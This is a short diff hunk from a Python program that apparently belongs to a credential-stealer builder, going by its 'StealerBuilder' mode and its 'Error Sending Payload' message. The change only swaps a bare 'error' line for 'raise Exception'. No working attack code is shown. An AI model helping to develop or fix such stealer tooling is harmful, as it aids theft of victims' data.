@@ -1459,7 +1459,7 @@ elif mode == "StealerBuilder":
                         pass
                     else:
                         print(j['message'])
-                        error
+                        raise Exception
             except Exception as e:
                 print("Error Sending Payload")
             else:
